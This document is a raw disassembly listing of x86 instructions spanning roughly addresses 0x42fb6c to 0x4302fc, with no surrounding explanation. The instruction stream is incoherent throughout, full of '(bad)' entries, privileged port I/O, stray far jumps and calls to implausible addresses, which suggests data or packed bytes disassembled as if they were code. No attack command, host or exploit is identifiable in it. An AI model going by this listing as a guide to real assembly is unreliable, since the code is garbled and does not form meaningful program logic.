  42fb6c:	add    BYTE PTR [ebx-0x1e8b968a],al
  42fb72:	pop    edi
  42fb73:	icebp  
  42fb74:	and    eax,DWORD PTR [eax]
  42fb76:	test   al,0xe8
  42fb78:	outs   dx,BYTE PTR ds:[esi]
  42fb79:	and    al,0xb0
  42fb7b:	pop    ecx
  42fb7c:	cli    
  42fb7d:	aas    
  42fb7e:	int3   
  42fb7f:	add    DWORD PTR [esi-0x1],ecx
  42fb82:	mov    eax,ds:0x9c400e79
  42fb87:	fsubr  QWORD PTR [eax-0x9]
  42fb8a:	push   eax
  42fb8b:	and    dl,BYTE PTR [eax]
  42fb8d:	add    BYTE PTR [ecx+eax*1+0x34907400],dl
  42fb94:	shr    bl,0x89
  42fb97:	push   esp
  42fb98:	dec    ebp
  42fb99:	jmp    DWORD PTR [ecx-0x73bff18f]
  42fb9f:	test   dl,dh
  42fba1:	inc    DWORD PTR [eax+0x55]
  42fba4:	add    BYTE PTR fs:[ebx-0x50],ch
  42fba8:	mov    edx,0x1178450
  42fbad:	add    BYTE PTR [eax+ebp*8+0x73],cl
  42fbb1:	or     bl,ch
  42fbb3:	adc    eax,ebp
  42fbb5:	adc    al,0x0
  42fbb7:	add    BYTE PTR [eax],al
  42fbb9:	add    BYTE PTR [eax],al
  42fbbb:	pushf  
  42fbbc:	push   es
  42fbbd:	jecxz  0x42fbfc
  42fbbf:	pop    ebx
  42fbc0:	mov    al,0xca
  42fbc2:	shl    esp,0x10
  42fbc5:	mov    DWORD PTR [eax+esi*1+0x15],eax
  42fbc9:	pop    es
  42fbca:	mov    bh,0x5d
  42fbcc:	pop    edi
  42fbcd:	cli    
  42fbce:	inc    BYTE PTR [ecx-0x7]
  42fbd1:	mov    BYTE PTR [eax+esi*2+0x1e],al
  42fbd5:	shr    ecx,0x1c
  42fbd8:	pop    ecx
  42fbd9:	adc    bl,ah
  42fbdb:	fild   WORD PTR [eax]
  42fbdd:	lea    eax,[eax+esi*2+0x22]
  42fbe1:	mov    DWORD PTR [eax+esi*2+0x22],edx
  42fbe5:	mov    DWORD PTR [eax+esi*2+0x36],ecx
  42fbe9:	call   0xf62b1778
  42fbee:	jmp    0x42fbc8
  42fbf0:	out    0x33,eax
  42fbf2:	sub    BYTE PTR [ebp+0x37],dh
  42fbf5:	ret    0xdbff
  42fbf8:	jne    0x42fbe4
  42fbfa:	adc    esi,DWORD PTR ds:0x9134755b
  42fc00:	cmpps  xmm7,xmm7,0xc3
  42fc04:	dec    ebp
  42fc05:	scas   al,BYTE PTR es:[edi]
  42fc06:	or     eax,0x59d55b35
  42fc0b:	data16 fadd QWORD PTR [esi+0x7422d90]
  42fc13:	jne    0x42fc43
  42fc15:	(bad)  
  42fc16:	jmp    0x42fc0e
  42fc18:	scas   al,BYTE PTR es:[edi]
  42fc19:	fcomip st,st(1)
  42fc1b:	js     0x42fc18
  42fc1d:	push   ebp
  42fc1e:	add    BYTE PTR ds:[eax],al
  42fc21:	add    BYTE PTR [eax],al
  42fc23:	add    BYTE PTR [ebp+0x67],dh
  42fc26:	jmp    0x7500:0x12a78d29
  42fc2d:	out    0x43,eax
  42fc2f:	jae    0x42fbc9
  42fc31:	(bad)  
  42fc33:	lea    esi,[eax-0xf982c13]
  42fc39:	and    dh,BYTE PTR [ecx]
  42fc3b:	sub    DWORD PTR [ebp-0x8],ecx
  42fc3e:	pop    ss
  42fc3f:	add    BYTE PTR [ebp-0x7c],dh
  42fc42:	jmp    0xc8fa:0x9826f80f
  42fc49:	gs ja  0x42fcc0
  42fc4c:	ins    DWORD PTR es:[edi],dx
  42fc4d:	or     DWORD PTR [ecx+0x14],edi
  42fc50:	mov    ecx,0x1fffbe6e
  42fc55:	pop    ebp
  42fc56:	ja     0x42fccc
  42fc58:	test   esp,edx
  42fc5a:	jmp    0x68fb:0x6571a0b
  42fc61:	ins    DWORD PTR es:[edi],dx
  42fc62:	or     DWORD PTR [eax+0x75],eax
  42fc65:	xor    al,BYTE PTR [edx+0xb]
  42fc68:	jne    0x42fc95
  42fc6a:	sti    
  42fc6b:	pop    ds
  42fc6c:	sbb    ebx,DWORD PTR [ecx+0x26903fe]
  42fc72:	repnz imul ebx,DWORD PTR ds:0xf903e90e,0x42
  42fc7a:	pushf  
  42fc7b:	add    DWORD PTR [edx+0x7645a842],ecx
  42fc81:	add    al,BYTE PTR [edx]
  42fc83:	pop    ds
  42fc84:	pop    ebp
  42fc85:	push   ss
  42fc86:	test   eax,0x3
  42fc8b:	add    BYTE PTR [eax],al
  42fc8d:	sub    BYTE PTR [edi+0x4],dh
  42fc90:	jb     0x42fd03
  42fc92:	and    cl,BYTE PTR [ebx]
  42fc94:	lds    esi,FWORD PTR [edx+0x218d3aff]
  42fc9a:	(bad)  
  42fc9b:	push   esp
  42fc9c:	and    ecx,DWORD PTR [ebp+0x7503f386]
  42fca2:	xchg   BYTE PTR [eax-0x3d89511],ch
  42fca8:	and    ebp,DWORD PTR [ecx+0x72eee8bf]
  42fcae:	imul   edi,DWORD PTR [ebx],0x14
  42fcb1:	repnz mov ebp,0xfae978d4
  42fcb7:	nop
  42fcb8:	scas   al,BYTE PTR es:[edi]
  42fcb9:	imul   ebp,DWORD PTR [ebx-0x67],0x1b6b726c
  42fcc0:	adc    BYTE PTR [esi-0xb],bl
  42fcc3:	clc    
  42fcc4:	ror    DWORD PTR [edi-0xb],1
  42fcc7:	lock js 0x42fd2b
  42fcca:	cli    
  42fccb:	aam    0xc3
  42fccd:	inc    edx
  42fcce:	int    0x13
  42fcd0:	inc    esi
  42fcd1:	push   0x2
  42fcd3:	adc    al,0x8d
  42fcd5:	push   ds
  42fcd6:	je     0x42fcc3
  42fcd8:	and    ecx,DWORD PTR [edi-0x41]
  42fcdb:	call   0xdbbac1df
  42fce0:	pop    es
  42fce1:	mov    eax,ds:0x70394121
  42fce6:	add    ch,cl
  42fce8:	jg     0x42fcb4
  42fcea:	cmc    
  42fceb:	loopne 0x42fd29
  42fced:	dec    eax
  42fcee:	and    al,BYTE PTR [eax]
  42fcf0:	adc    eax,0x0
  42fcf5:	add    BYTE PTR [ecx],dh
  42fcf7:	imul   esi,DWORD PTR [ebx-0x27],0x6d
  42fcfb:	test   BYTE PTR [edi],0x72
  42fcfe:	mov    bl,0xe
  42fd00:	sti    
  42fd01:	xchg   esp,eax
  42fd02:	outs   dx,BYTE PTR ds:[esi]
  42fd03:	pop    edx
  42fd04:	push   0x14
  42fd06:	pop    ebp
  42fd07:	push   0xf64df9e6
  42fd0c:	adc    eax,DWORD PTR [esi]
  42fd0e:	(bad)  
  42fd10:	push   ecx
  42fd11:	(bad)  
  42fd12:	rol    BYTE PTR [edx],1
  42fd14:	sti    
  42fd15:	fadd   QWORD PTR [edx-0x3316bfeb]
  42fd1b:	int    0xbd
  42fd1d:	stc    
  42fd1e:	jbe    0x42fcf5
  42fd20:	xchg   ch,cl
  42fd22:	adc    eax,DWORD PTR [esi]
  42fd24:	and    BYTE PTR [edi+0x36fe6ab6],dh
  42fd2a:	(bad)  
  42fd2b:	cmc    
  42fd2c:	or     edi,DWORD PTR ds:0xddf75a50
  42fd32:	jbe    0x42fd36
  42fd34:	test   BYTE PTR [ecx-0xbc8ed7b],ch
  42fd3a:	xchg   esi,eax
  42fd3b:	inc    esi
  42fd3c:	ds jmp 0x153df7a7
  42fd42:	mov    DWORD PTR [ecx-0x111c02b4],eax
  42fd48:	pop    es
  42fd49:	and    DWORD PTR [eax-0x21790599],0x72f4faf9
  42fd53:	ins    DWORD PTR es:[edi],dx
  42fd54:	je     0x42fd2f
  42fd56:	sub    BYTE PTR [ebp+0x74],ch
  42fd59:	loope  0x42fd5b
  42fd5b:	add    BYTE PTR [eax],al
  42fd5d:	add    BYTE PTR [eax],al
  42fd5f:	stos   DWORD PTR es:[edi],eax
  42fd60:	push   cs
  42fd61:	sub    al,0xfc
  42fd63:	ss push 0x5c
  42fd66:	mov    esp,0xbbfff9b4
  42fd6b:	out    dx,eax
  42fd6c:	pop    ebp
  42fd6d:	icebp  
  42fd6e:	in     al,0x56
  42fd70:	dec    esp
  42fd71:	add    BYTE PTR ds:[edx+ebp*2],bl
  42fd75:	push   eax
  42fd76:	mov    ecx,ecx
  42fd78:	add    DWORD PTR [ecx+eiz*1-0x4c],esi
  42fd7c:	mov    ah,0x16
  42fd7e:	add    ah,bl
  42fd80:	jmp    0x2db7723f
  42fd85:	xor    eax,0xfa45a020
  42fd8a:	je     0x42fd68
  42fd8c:	lock jae 0x42fd9f
  42fd8f:	push   edi
  42fd90:	cmp    ecx,DWORD PTR [esi]
  42fd92:	dec    DWORD PTR [ecx-0x3]
  42fd95:	out    0xe3,eax
  42fd97:	shl    al,0xf5
  42fd9a:	jmp    0x42fd38
  42fd9c:	lock jae 0x42fdb3
  42fd9f:	mov    ds:0x93560a72,eax
  42fda4:	jb     0x42fda8
  42fda6:	jmp    FWORD PTR [ecx-0x73bff1b7]
  42fdac:	dec    edi
  42fdad:	pop    ebx
  42fdae:	ret    0x58c
  42fdb1:	push   ebp
  42fdb2:	mov    esp,DWORD PTR [eax-0x1ddffc29]
  42fdb8:	inc    esp
  42fdb9:	cli    
  42fdba:	add    ebx,DWORD PTR [edx+0x7d]
  42fdbd:	jae    0x42fdcf
  42fdbf:	test   al,0x1f
  42fdc1:	call   0x42fe32
  42fdc6:	add    BYTE PTR [eax],al
  42fdc8:	jo     0x42fdc8
  42fdca:	inc    DWORD PTR [ebx+0x3b12590c]
  42fdd0:	cmp    DWORD PTR ds:0x725c43dc,esp
  42fdd6:	or     bh,bh
  42fdd8:	dec    ecx
  42fdd9:	stc    
  42fdda:	or     BYTE PTR [ebp+0x54],0xf0
  42fdde:	jae    0x42fde8
  42fde0:	hlt    
  42fde1:	mov    esi,esi
  42fde3:	jmp    DWORD PTR [ebx+0x49ff09dc]
  42fde9:	or     eax,0x372875f7
  42fdee:	cmc    
  42fdef:	jne    0x42fe66
  42fdf1:	pop    edi
  42fdf2:	jno    0x42fe68
  42fdf4:	jge    0x42fdae
  42fdf6:	(bad)  
  42fdf8:	popa   
  42fdf9:	fwait
  42fdfa:	(bad)  
  42fdfb:	pop    ecx
  42fdfc:	mov    al,ds:0xa0000b1d
  42fe01:	in     al,0x62
  42fe03:	icebp  
  42fe04:	js     0x42fe01
  42fe06:	push   ecx
  42fe07:	ds jne 0x42fe61
  42fe0a:	int3   
  42fe0b:	xchg   BYTE PTR [eax+0x6b],ch
  42fe0e:	jmp    0x7500:0x123bcd20
  42fe15:	fistp  QWORD PTR [esi]
  42fe17:	jae    0x42fe86
  42fe19:	inc    esp
  42fe1a:	das    
  42fe1b:	and    BYTE PTR [ecx+0x6574fe9b],ah
  42fe21:	jo     0x42fe0d
  42fe23:	adc    edi,esi
  42fe25:	test   DWORD PTR [esi],edx
  42fe27:	sti    
  42fe28:	and    BYTE PTR [ebx+0x66],dh
  42fe2b:	push   ebx
  42fe2c:	add    BYTE PTR [eax],al
  42fe2e:	add    BYTE PTR [eax],al
  42fe30:	add    BYTE PTR [ecx-0x79198bb9],ah
  42fe36:	push   eax
  42fe37:	jmp    0x8a52:0xfcd9217
  42fe3e:	and    eax,0x7308fb08
  42fe43:	jae    0x42fe59
  42fe45:	inc    ebp
  42fe46:	inc    esi
  42fe47:	mov    esi,0x3df6d0ff
  42fe4c:	adc    esi,DWORD PTR [ebp+0x26]
  42fe4f:	mov    ebx,ebp
  42fe51:	imul   ebx,DWORD PTR [edi+0x1e],0xffffffda
  42fe55:	mov    dh,0x59
  42fe57:	cli    
  42fe58:	push   ecx
  42fe59:	dec    BYTE PTR [esi]
  42fe5b:	or     BYTE PTR [esp+edx*4-0x6f],dh
  42fe5f:	push   ebp
  42fe60:	push   ss
  42fe61:	jne    0x42febc
  42fe63:	jp     0x42fe24
  42fe65:	rcl    DWORD PTR [ecx+0x37],0x35
  42fe69:	push   ebp
  42fe6a:	jne    0x42fe2c
  42fe6c:	jmp    DWORD PTR [ecx-0x568b06fe]
  42fe72:	adc    ch,BYTE PTR [esi-0x39]
  42fe75:	xchg   BYTE PTR [edi-0x25],ah
  42fe78:	or     ebx,DWORD PTR ds:0xf754cfc
  42fe7e:	pop    esp
  42fe7f:	fdiv   DWORD PTR [ecx+ecx*4+0xe]
  42fe83:	cmp    ch,bh
  42fe85:	push   0xffffffd0
  42fe87:	xor    edi,ebp
  42fe89:	jp     0x42fef2
  42fe8b:	rol    ebx,cl
  42fe8d:	add    edx,0x4441d5e8
  42fe93:	clc    
  42fe94:	add    eax,DWORD PTR [eax]
  42fe96:	add    BYTE PTR [eax],al
  42fe98:	add    BYTE PTR [eax],al
  42fe9a:	inc    eax
  42fe9b:	jnp    0x42fea1
  42fe9d:	outs   dx,BYTE PTR ds:[esi]
  42fe9e:	jns    0x42fec2
  42fea0:	sub    eax,ecx
  42fea2:	retf   0x9b03
  42fea5:	mov    BYTE PTR [ecx-0xa],cl
  42fea8:	je     0x42fecc
  42feaa:	int    0x8e
  42feac:	int    0x3
  42feae:	jne    0x42ff2e
  42feb0:	sub    al,dh
  42feb2:	sub    BYTE PTR [ebx],0x1c
  42feb5:	and    al,0xc1
  42feb7:	ret    
  42feb8:	call   0x5baa69ab
  42febd:	adc    al,0xfa
  42febf:	mov    ch,0xf4
  42fec1:	je     0x42fec4
  42fec3:	cli    
  42fec4:	sar    BYTE PTR [esi],1
  42fec6:	mov    esp,DWORD PTR [edi-0x47]
  42fec9:	push   0x103b676a
  42fece:	outs   dx,BYTE PTR ds:[esi]
  42fecf:	in     eax,dx
  42fed0:	fmul   st,st(5)
  42fed2:	outs   dx,DWORD PTR ds:[esi]
  42fed3:	in     eax,dx
  42fed4:	lock je 0x42fe60
  42fed7:	loop   0x42fecd
  42fed9:	ret    
  42feda:	pop    edx
  42fedb:	lds    esi,FWORD PTR [ebx]
  42fedd:	inc    edx
  42fede:	add    BYTE PTR [edx],0x34
  42fee1:	mov    DWORD PTR [esi+0x70],ebx
  42fee4:	jmp    0x42ff09
  42fee6:	pop    ds
  42fee7:	ret    
  42fee8:	call   0xffbea3ec
  42feed:	sti    
  42feee:	xchg   dh,ch
  42fef0:	and    BYTE PTR [ecx-0x16ffefd0],al
  42fef6:	mov    ds:0x5c0173a7,al
  42fefb:	sub    eax,0x3520
  42ff00:	add    BYTE PTR [eax],al
  42ff02:	add    BYTE PTR ds:0x81f97367,dh
  42ff08:	out    dx,al
  42ff09:	adc    esi,DWORD PTR [edx+0x3b]
  42ff0c:	psubq  mm6,QWORD PTR [edx+esi*2+0x69327a5a]
  42ff14:	ins    BYTE PTR es:[edi],dx
  42ff15:	out    0xda,al
  42ff17:	popa   
  42ff18:	out    dx,al
  42ff19:	pop    ss
  42ff1a:	rcl    DWORD PTR es:[edx],cl
  42ff1d:	push   edx
  42ff1e:	push   ds
  42ff1f:	retf   
  42ff20:	cli    
  42ff21:	cli    
  42ff22:	pushf  
  42ff23:	jle    0x42ff90
  42ff25:	adc    al,0xb5
  42ff27:	jp     0x42feeb
  42ff29:	jmp    DWORD PTR [esi-0x16ec5b55]
  42ff2f:	stos   DWORD PTR es:[edi],eax
  42ff30:	jg     0x42ff1d
  42ff32:	push   DWORD PTR [eax+0x76aada06]
  42ff38:	(bad)  
  42ff39:	push   ecx
  42ff3a:	jb     0x42fed8
  42ff3c:	div    BYTE PTR [ebx+0x8]
  42ff3f:	cmp    esi,edi
  42ff41:	push   ss
  42ff42:	jmp    0x56027dbd
  42ff47:	jns    0x42ff78
  42ff49:	xor    eax,0x282509
  42ff4e:	xor    al,0x61
  42ff50:	imul   esi,DWORD PTR [ebp+ebx*8-0xd],0xffffffb6
  42ff55:	pop    ss
  42ff56:	scas   al,BYTE PTR es:[edi]
  42ff57:	ins    BYTE PTR es:[edi],dx
  42ff58:	cli    
  42ff59:	out    0xdf,eax
  42ff5b:	shr    DWORD PTR [eax-0x6],cl
  42ff5e:	xchg   edx,eax
  42ff5f:	sub    BYTE PTR [ecx+0x74],0xf1
  42ff63:	(bad)  
  42ff64:	out    dx,al
  42ff65:	adc    esi,DWORD PTR [edi]
  42ff67:	add    BYTE PTR [eax],al
  42ff69:	add    BYTE PTR [eax],al
  42ff6b:	add    dh,al
  42ff6d:	out    dx,al
  42ff6e:	or     eax,DWORD PTR [eax]
  42ff70:	sti    
  42ff71:	imul   eax,DWORD PTR [edx],0xffffffff
  42ff74:	and    DWORD PTR [edx],edi
  42ff76:	push   cs
  42ff77:	inc    eax
  42ff78:	sbb    al,0x54
  42ff7a:	pop    ebx
  42ff7b:	ret    0x240
  42ff7e:	xor    eax,DWORD PTR ds:0x400e24
  42ff84:	inc    ecx
  42ff85:	cld    
  42ff86:	mov    bh,0x8e
  42ff88:	pop    ecx
  42ff89:	cmp    al,0xfa
  42ff8b:	ret    0xfb67
  42ff8e:	cmp    edx,DWORD PTR ds:0x67501cc
  42ff94:	hlt    
  42ff95:	retf   0x42cb
  42ff98:	fdivr  QWORD PTR [ecx+esi*1+0x400b1c05]
  42ff9f:	add    BYTE PTR [ecx],al
  42ffa1:	cld    
  42ffa2:	mov    bh,0x38
  42ffa4:	mov    edi,DWORD PTR [edx+edi*8]
  42ffa7:	ret    0xfab7
  42ffaa:	pop    edi
  42ffab:	adc    al,0x1c
  42ffad:	add    ch,bh
  42ffaf:	fcom   st(7)
  42ffb1:	shr    ebp,0xd0
  42ffb4:	mov    cl,0x73
  42ffb6:	lds    eax,FWORD PTR [edx-0x64]
  42ffb9:	mov    esp,0x7ca88b53
  42ffbe:	out    0x28,al
  42ffc0:	ret    0x1ffa
  42ffc3:	fimul  WORD PTR [edi-0x2]
  42ffc6:	add    edx,DWORD PTR [esi+0x17]
  42ffc9:	push   0x2
  42ffcb:	je     0x42ff57
  42ffcd:	leave  
  42ffce:	jnp    0x42ffea
  42ffd0:	add    BYTE PTR [eax],al
  42ffd2:	add    BYTE PTR [eax],al
  42ffd4:	add    BYTE PTR [ecx+eax*1+0x1b40c084],cl
  42ffdb:	test   esi,esi
  42ffdd:	mov    al,0x1f
  42ffdf:	add    DWORD PTR [esi+0x50],0xffffffc9
  42ffe3:	xchg   esi,eax
  42ffe4:	call   FWORD PTR [ebx]
  42ffe6:	lock add eax,0xffffff80
  42ffea:	or     esp,DWORD PTR [edx+0x28]
  42ffed:	jne    0x430014
  42ffef:	or     DWORD PTR [ebp+ebp*1+0x2a],0x7c05685c
  42fff7:	ins    DWORD PTR es:[edi],dx
  42fff8:	mov    BYTE PTR [eax+0x4d447f87],dh
  42fffe:	or     ebx,DWORD PTR [ebx+0x0]
  430001:	ret    
  430002:	aam    0x17
  430004:	pop    esp
  430005:	mov    DWORD PTR [ebx+0x192c59fe],ebx
  43000b:	add    eax,DWORD PTR [eax]
  43000d:	test   al,0xe0
  43000f:	pop    edx
  430010:	jle    0x43002b
  430012:	add    esi,DWORD PTR [esi+0x4]
  430015:	push   ebp
  430016:	sbb    eax,0x8d76ffc2
  43001b:	jns    0x430091
  43001d:	jge    0x42ffc6
  43001f:	and    al,ch
  430021:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  430022:	push   ecx
  430023:	(bad)  
  430024:	(bad)  
  430025:	stc    
  430026:	sbb    dh,bl
  430028:	and    al,0xf0
  43002a:	or     al,0xf3
  43002c:	and    dh,bh
  43002e:	xchg   esp,eax
  43002f:	add    ch,al
  430031:	cmp    dh,ah
  430033:	ins    DWORD PTR es:[edi],dx
  430034:	cli    
  430035:	clc    
  430036:	sbb    dh,bl
  430038:	adc    al,0x0
  43003a:	add    BYTE PTR [eax],al
  43003c:	add    BYTE PTR [eax],al
  43003e:	dec    edi
  43003f:	push   ebx
  430040:	fmul   DWORD PTR [eax+eax*2-0x76182bed]
  430047:	sub    ebp,DWORD PTR [esi-0x6]
  43004a:	in     al,dx
  43004b:	adc    eax,0x43308c50
  430050:	shl    esi,cl
  430052:	je     0x430079
  430054:	jno    0x43006a
  430056:	cmp    DWORD PTR [edi-0x42],ebp
  430059:	jmp    DWORD PTR [eax]
  43005b:	mov    dl,0x41
  43005d:	add    esi,DWORD PTR [ebp+0xe]
  430060:	jge    0x43004d
  430062:	idiv   BYTE PTR ds:0xf970f233
  430068:	dec    ebp
  430069:	ds jne 0x43006e
  43006c:	in     eax,dx
  43006d:	fpatan 
  43006f:	in     eax,dx
  430070:	lock mul DWORD PTR [ebx+0x750b855a]
  430077:	add    ah,BYTE PTR [ebp+0x44]
  43007a:	(bad)  
  43007b:	sbb    BYTE PTR [edx+edi*2-0x3a],ch
  43007f:	sbb    al,0x66
  430081:	xor    ah,BYTE PTR [ebp-0x13]
  430084:	(bad)  
  430085:	jl     0x43003b
  430087:	cli    
  430088:	sub    BYTE PTR [edi+0x1c],0x64
  43008c:	popa   
  43008d:	xchg   edx,ebx
  43008f:	out    dx,al
  430090:	repz frstor [edx-0x34]
  430094:	arpl   WORD PTR [edi+0x3e40d23a],di
  43009a:	iret   
  43009b:	arpl   WORD PTR [ecx+0x7b],ax
  43009e:	mov    cl,0x4a
  4300a0:	imul   eax,edi,0x0
  4300a3:	add    BYTE PTR [eax],al
  4300a5:	add    BYTE PTR [eax],al
  4300a7:	ret    0x3dd2
  4300aa:	add    eax,DWORD PTR [edi+0x63]
  4300ad:	shr    DWORD PTR [ebx],cl
  4300af:	mov    dl,al
  4300b1:	call   0xe483ae87
  4300b6:	add    ebp,DWORD PTR [eax]
  4300b8:	ja     0x4300be
  4300ba:	test   esi,ebx
  4300bc:	xor    dl,BYTE PTR [ebx]
  4300be:	pop    es
  4300bf:	xchg   ebp,eax
  4300c0:	inc    esp
  4300c1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4300c2:	add    esi,DWORD PTR [ecx-0x34]
  4300c5:	ins    DWORD PTR es:[edi],dx
  4300c6:	idiv   DWORD PTR [edx-0x12]
  4300c9:	mov    ch,0x5b
  4300cb:	add    eax,0xf903e90a
  4300d0:	inc    edx
  4300d1:	pop    esp
  4300d2:	push   ds
  4300d3:	lock ins BYTE PTR es:[edi],dx
  4300d5:	push   esp
  4300d6:	sub    dl,BYTE PTR [edx]
  4300d8:	and    al,0x19
  4300da:	not    DWORD PTR [ebp+0x77]
  4300dd:	and    bh,ah
  4300df:	call   0xa87d:0x7f70c297
  4300e6:	test   DWORD PTR [ecx+0x4cf8ffd8],0x47994c76
  4300f0:	pop    ebx
  4300f1:	ja     0x430149
  4300f3:	in     eax,0x68
  4300f5:	mov    BYTE PTR [ecx+eax*8],ah
  4300f8:	jbe    0x43013e
  4300fa:	mov    ecx,0x37005c26
  4300ff:	les    ecx,FWORD PTR [esi]
  430101:	sub    ah,bl
  430103:	arpl   WORD PTR ss:[eax+esi*4-0x48],bx
  430108:	(bad)  
  430109:	call   FWORD PTR [ebx]
  43010b:	add    BYTE PTR [eax],al
  43010d:	add    BYTE PTR [eax],al
  43010f:	add    BYTE PTR [eax-0x5fe9b1a9],ch
  430115:	inc    ecx
  430116:	out    0xdf,eax
  430118:	jbe    0x43011c
  43011a:	add    BYTE PTR [ecx+0x7f],dl
  43011d:	(bad)  
  43011e:	(bad)  
  43011f:	call   0xba914c65
  430124:	sub    DWORD PTR [eax+0x74],ebp
  430127:	fnstcw WORD PTR [ecx+0x6b]
  43012a:	push   edx
  43012b:	mov    edx,DWORD PTR ds:[esi-0x308956ec]
  430132:	mov    bh,ah
  430134:	ds test ax,0x6526
  430139:	sub    bl,BYTE PTR [edx]
  43013b:	xchg   esp,eax
  43013c:	jp     0x430152
  43013e:	rol    BYTE PTR [edx],0x8
  430141:	test   al,0x3
  430143:	mov    ecx,0xacc162b6
  430148:	data16 (bad) 
  43014a:	(bad)  
  43014b:	call   0x6446ddc6
  430150:	mov    ebp,0x6aee4ffe
  430155:	addr16 xor esi,esp
  430158:	jl     0x4301d0
  43015a:	adc    al,0x29
  43015c:	jns    0x430141
  43015e:	ret    0x1be1
  430161:	mov    dh,0xf
  430163:	push   esp
  430164:	and    DWORD PTR [esi+ecx*2+0x4aff2600],esi
  43016b:	push   ebx
  43016c:	xor    ebx,DWORD PTR [esi+eax*1-0x1]
  430170:	test   eax,0x36f55e
  430175:	add    BYTE PTR [eax],al
  430177:	add    BYTE PTR [eax],al
  430179:	adc    edi,esp
  43017b:	ret    
  43017c:	adc    eax,0x4689068c
  430181:	pop    eax
  430182:	sub    eax,0xdd5575bb
  430187:	shr    al,0x56
  43018a:	push   es
  43018b:	add    BYTE PTR [eax],al
  43018d:	out    0x9a,eax
  43018f:	stos   BYTE PTR es:[edi],al
  430190:	add    DWORD PTR [ebx+0x10c25b4d],edx
  430196:	push   es
  430197:	dec    esi
  430198:	push   edi
  430199:	xchg   edi,eax
  43019a:	(bad)  
  43019b:	loop   0x4301c0
  43019d:	or     al,0x6
  43019f:	add    BYTE PTR [ebx+0x3d8309da],cl
  4301a5:	hlt    
  4301a6:	sti    
  4301a7:	aas    
  4301a8:	add    BYTE PTR [ecx-0x23f8913a],bl
  4301ae:	lock int 0x83
  4301b1:	mov    edx,0xda8b0009
  4301b6:	mov    bh,BYTE PTR [edx-0xaca258c]
  4301bc:	xlat   BYTE PTR ds:[ebx]
  4301bd:	dec    edi
  4301be:	sub    BYTE PTR [eax],al
  4301c0:	pop    edi
  4301c1:	adc    al,ch
  4301c3:	add    DWORD PTR [esi-0x2c],0xd774ba8a
  4301ca:	xor    eax,0xfb2415f5
  4301cf:	aas    
  4301d0:	add    BYTE PTR [edi],bl
  4301d2:	push   0x3b5f0002
  4301d7:	sub    esp,0x112e20d
  4301dd:	add    BYTE PTR [eax],al
  4301df:	add    BYTE PTR [eax],al
  4301e1:	add    BYTE PTR [ebp+eax*1+0x4a05564b],cl
  4301e8:	test   BYTE PTR [ebx-0x290318b],0x2b
  4301ef:	in     al,0x73
  4301f1:	mov    dh,0x75
  4301f3:	dec    eax
  4301f4:	cli    
  4301f5:	sub    ecx,0x66
  4301f8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4301f9:	jmp    FWORD PTR [ebx+0x27]
  4301fc:	mov    BYTE PTR [edi-0x7efde887],ah
  430202:	cs imul edi,esi,0x7f
  430206:	jne    0x4301c8
  430208:	data16 jno 0x4301c0
  43020b:	imul   edx,DWORD PTR [esi-0x56993800],0xffffffff
  430212:	ret    
  430213:	sub    eax,DWORD PTR [eax+ebp*8]
  430216:	loop   0x4301f7
  430218:	imul   edi,edx,0x67cd6b9f
  43021e:	sub    eax,0x8cffbda8
  430223:	imul   edx,esi,0xffffffeb
  430226:	mov    ebp,DWORD PTR [ebx+0x6380fafe]
  43022c:	sar    edx,1
  43022e:	mov    esp,DWORD PTR [edi+0x69]
  430231:	adc    al,0xbd
  430233:	cmp    eax,0xa8fdffbe
  430238:	test   BYTE PTR [ebp+esi*4+0x75f08267],0x6b
  430240:	(bad)  
  430241:	gs jno 0x43021a
  430244:	mov    edi,0x7
  430249:	add    BYTE PTR [eax],al
  43024b:	and    al,0x75
  43024d:	mov    edi,0xf6adb24f
  430252:	add    BYTE PTR [ebp+0x6b],dh
  430255:	(bad)  
  430256:	cli    
  430257:	pusha  
  430258:	xlat   BYTE PTR ds:[ebx]
  430259:	pop    ss
  43025a:	inc    eax
  43025b:	jne    0x430250
  43025d:	adc    al,0xec
  43025f:	stos   BYTE PTR es:[edi],al
  430260:	push   edi
  430261:	js     0x43029f
  430263:	jmp    0xe042c09d
  430268:	add    ecx,ebp
  43026a:	add    esi,DWORD PTR [ebp-0x5e]
  43026d:	sbb    al,0x8
  43026f:	add    BYTE PTR [edi],cl
  430271:	rol    esi,0x8e
  430274:	pusha  
  430275:	leave  
  430276:	mov    BYTE PTR [edx+0x72876d10],bh
  43027c:	pusha  
  43027d:	call   0x194db400
  430282:	jg     0x43027d
  430284:	pop    ecx
  430285:	stos   BYTE PTR es:[edi],al
  430286:	ins    DWORD PTR es:[edi],dx
  430287:	pop    edi
  430288:	mov    bl,0xa9
  43028a:	(bad)  
  43028b:	jp     0x43028f
  43028d:	call   0xfba27795
  430292:	(bad)  [ebx-0x3e]
  430295:	call   0x1018fd20
  43029a:	lods   al,BYTE PTR ds:[esi]
  43029b:	das    
  43029c:	add    ebp,ecx
  43029e:	add    ebp,DWORD PTR [ebp+eax*8-0x20]
  4302a2:	cld    
  4302a3:	pusha  
  4302a4:	(bad)
  4302a7:	test   BYTE PTR ds:0x600f6e60,0xe8
  4302ae:	jle    0x4302b0
  4302b0:	add    BYTE PTR [eax],al
  4302b2:	add    BYTE PTR [eax],al
  4302b4:	icebp  
  4302b5:	pop    ecx
  4302b6:	push   edx
  4302b7:	ins    DWORD PTR es:[edi],dx
  4302b8:	push   DWORD PTR [edx-0xacee8b7]
  4302be:	test   al,0x3
  4302c0:	cld    
  4302c1:	(bad)
  4302c4:	sub    dl,bh
  4302c6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4302c7:	fld    DWORD PTR [ebp-0x23a39c73]
  4302cd:	pop    edi
  4302ce:	and    esp,ebx
  4302d0:	jb     0x430262
  4302d2:	test   al,0x3
  4302d4:	and    eax,0x64bffb5f
  4302d9:	ret    0x78e8
  4302dc:	xor    DWORD PTR [edx],ecx
  4302de:	dec    ax
  4302e0:	jle    0x4302cc
  4302e2:	xchg   esp,eax
  4302e3:	jmp    0x6ed:0x6400026a
  4302ea:	stc    
  4302eb:	out    dx,eax
  4302ec:	or     DWORD PTR [edi+ecx*2-0x1a],ebx
  4302f0:	imul   ecx,DWORD PTR [edx],0x11
  4302f3:	sub    DWORD PTR [ecx-0x79],esi
  4302f6:	inc    esp
  4302f7:	loope  0x43029e
  4302f9:	loopne 0x4302ba
  4302fb:	cli    
  4302fc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
